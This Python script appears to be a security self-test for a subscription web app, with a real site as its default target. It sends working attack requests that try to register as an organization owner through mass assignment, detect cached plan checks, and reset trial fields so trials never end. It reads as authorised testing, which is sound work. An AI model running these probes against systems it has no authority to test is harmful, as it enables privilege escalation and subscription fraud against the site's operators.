#!/usr/bin/env python3
"""
Test Business Logic Vulnerabilities
Tests cache bypass, plan manipulation, and subscription logic flaws
"""

import requests
import time
import json
from datetime import datetime
from colorama import Fore, Style, init

init(autoreset=True)

class BusinessLogicTester:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.results = []

    def log_result(self, test_name, success, details):
        """Log test result"""
        result = {
            'test': test_name,
            'success': success,
            'details': details,
            'timestamp': datetime.now().isoformat()
        }
        self.results.append(result)

        status = f"{Fore.RED}VULNERABLE" if success else f"{Fore.GREEN}SECURE"
        print(f"[{status}{Style.RESET_ALL}] {test_name}")
        print(f"  └─ {details}\n")

    def test_organization_role_manipulation(self):
        """Test if users can manipulate organization roles"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"TEST 1: Organization Owner Role Manipulation")
        print(f"{'='*60}{Style.RESET_ALL}\n")

        timestamp = int(time.time())
        payload = {
            "name": "Fake Owner",
            "email": f"fake-owner-{timestamp}@example.com",
            "password": "Password123",
            "password_confirmation": "Password123",
            "team_role": "owner",
            "organization_id": 1  # Try to join existing org as owner
        }

        try:
            print(f"Attempting to register as organization owner...")
            response = requests.post(
                f"{self.base_url}/register",
                json=payload,
                headers={'Content-Type': 'application/json'},
                timeout=10
            )

            print(f"Status Code: {response.status_code}")
            print(f"Response: {response.text[:500]}\n")

            if response.status_code in [200, 201, 302]:
                self.log_result(
                    "Organization Role Manipulation",
                    True,
                    f"User registered with team_role='owner'! Email: {payload['email']}"
                )
                return True
            else:
                self.log_result(
                    "Organization Role Manipulation",
                    False,
                    "Role manipulation rejected"
                )
                return False

        except Exception as e:
            print(f"{Fore.RED}Error: {str(e)}{Style.RESET_ALL}\n")
            self.log_result("Organization Role Manipulation", False, f"Error: {str(e)}")
            return False

    def test_plan_cache_timing(self, email=None, password=None):
        """Test if plan check uses cache (timing attack possible)"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"TEST 2: Plan Check Cache Detection")
        print(f"{'='*60}{Style.RESET_ALL}\n")

        if not email or not password:
            print(f"{Fore.YELLOW}Skipped: No credentials provided{Style.RESET_ALL}\n")
            self.log_result(
                "Plan Cache Detection",
                False,
                "Skipped - requires authentication"
            )
            return False

        try:
            # Login
            login_response = requests.post(
                f"{self.base_url}/api/auth/login",
                json={"email": email, "password": password},
                headers={'Content-Type': 'application/json'},
                timeout=10
            )

            if login_response.status_code != 200:
                print(f"{Fore.YELLOW}Login failed{Style.RESET_ALL}\n")
                return False

            try:
                token = login_response.json().get('token') or login_response.json().get('access_token')
            except:
                print(f"{Fore.YELLOW}Could not extract token{Style.RESET_ALL}\n")
                return False

            # Make 10 rapid requests to same endpoint
            print(f"Making 10 rapid requests to detect caching...\n")
            response_times = []

            for i in range(10):
                start = time.time()
                response = requests.get(
                    f"{self.base_url}/api/v1/campaigns",
                    headers={'Authorization': f'Bearer {token}'},
                    timeout=10
                )
                elapsed = time.time() - start
                response_times.append(elapsed)

                if i < 3:
                    print(f"Request {i+1}: {elapsed:.3f}s - Status {response.status_code}")

            avg_time = sum(response_times) / len(response_times)
            first_request = response_times[0]
            subsequent_avg = sum(response_times[1:]) / len(response_times[1:])

            print(f"\n{Fore.CYAN}Timing Analysis:{Style.RESET_ALL}")
            print(f"  First request: {first_request:.3f}s")
            print(f"  Subsequent avg: {subsequent_avg:.3f}s")
            print(f"  Overall avg: {avg_time:.3f}s\n")

            # If subsequent requests are significantly faster (>30%), likely cached
            if first_request > subsequent_avg * 1.3:
                self.log_result(
                    "Plan Cache Detection",
                    True,
                    f"Plan check appears cached (first:{first_request:.3f}s, avg:{subsequent_avg:.3f}s)"
                )
                return True
            else:
                self.log_result(
                    "Plan Cache Detection",
                    False,
                    "No significant caching detected"
                )
                return False

        except Exception as e:
            print(f"{Fore.RED}Error: {str(e)}{Style.RESET_ALL}\n")
            self.log_result("Plan Cache Detection", False, f"Error: {str(e)}")
            return False

    def test_trial_reset_via_update(self, email=None, password=None):
        """Test if trial can be reset via profile update"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"TEST 3: Trial Reset via Profile Update")
        print(f"{'='*60}{Style.RESET_ALL}\n")

        if not email or not password:
            print(f"{Fore.YELLOW}Skipped: No credentials provided{Style.RESET_ALL}\n")
            return False

        try:
            # Login
            login_response = requests.post(
                f"{self.base_url}/api/auth/login",
                json={"email": email, "password": password},
                headers={'Content-Type': 'application/json'},
                timeout=10
            )

            if login_response.status_code != 200:
                print(f"{Fore.YELLOW}Login failed{Style.RESET_ALL}\n")
                return False

            try:
                token = login_response.json().get('token') or login_response.json().get('access_token')
            except:
                print(f"{Fore.YELLOW}Could not extract token{Style.RESET_ALL}\n")
                return False

            # Try to reset trial
            print(f"Attempting to reset trial via profile update...\n")

            update_response = requests.put(
                f"{self.base_url}/api/user/profile",
                json={
                    "trial_activated_at": None,
                    "trial_ends_at": None
                },
                headers={
                    'Authorization': f'Bearer {token}',
                    'Content-Type': 'application/json'
                },
                timeout=10
            )

            print(f"Status Code: {update_response.status_code}")
            print(f"Response: {update_response.text[:500]}\n")

            if update_response.status_code in [200, 201]:
                self.log_result(
                    "Trial Reset via Update",
                    True,
                    "Trial fields can be reset! Unlimited trials possible"
                )
                return True
            else:
                self.log_result(
                    "Trial Reset via Update",
                    False,
                    "Trial reset rejected"
                )
                return False

        except Exception as e:
            print(f"{Fore.RED}Error: {str(e)}{Style.RESET_ALL}\n")
            self.log_result("Trial Reset via Update", False, f"Error: {str(e)}")
            return False

    def run_all_tests(self, email=None, password=None):
        """Run all business logic tests"""
        print(f"\n{Fore.YELLOW}{'='*60}")
        print(f"BUSINESS LOGIC VULNERABILITY TESTS")
        print(f"{'='*60}{Style.RESET_ALL}\n")
        print(f"Target: {self.base_url}")
        print(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

        # Run tests
        self.test_organization_role_manipulation()
        time.sleep(1)

        self.test_plan_cache_timing(email, password)
        time.sleep(1)

        self.test_trial_reset_via_update(email, password)

        # Summary
        print(f"\n{Fore.YELLOW}{'='*60}")
        print(f"TEST SUMMARY")
        print(f"{'='*60}{Style.RESET_ALL}\n")

        vulnerable_count = sum(1 for r in self.results if r['success'])
        total_count = len(self.results)

        print(f"Total Tests: {total_count}")
        print(f"Vulnerable: {Fore.RED}{vulnerable_count}{Style.RESET_ALL}")
        print(f"Secure: {Fore.GREEN}{total_count - vulnerable_count}{Style.RESET_ALL}\n")

        if vulnerable_count > 0:
            print(f"{Fore.RED}⚠️  WARNING: Business logic flaws detected!{Style.RESET_ALL}")
            print(f"{Fore.RED}   These can lead to subscription bypass and revenue loss.{Style.RESET_ALL}\n")
        else:
            print(f"{Fore.GREEN}✓ All business logic tests passed{Style.RESET_ALL}\n")

        return self.results

if __name__ == "__main__":
    import sys
    import os
    from dotenv import load_dotenv

    load_dotenv()

    base_url = os.getenv('BASE_URL', 'https://evenleads.com')
    email = os.getenv('TEST_EMAIL')
    password = os.getenv('TEST_PASSWORD')

    if len(sys.argv) > 1:
        base_url = sys.argv[1]

    tester = BusinessLogicTester(base_url)
    results = tester.run_all_tests(email, password)

    with open('results_business_logic.json', 'w') as f:
        json.dump(results, f, indent=2)
    print(f"Results saved to: results_business_logic.json")
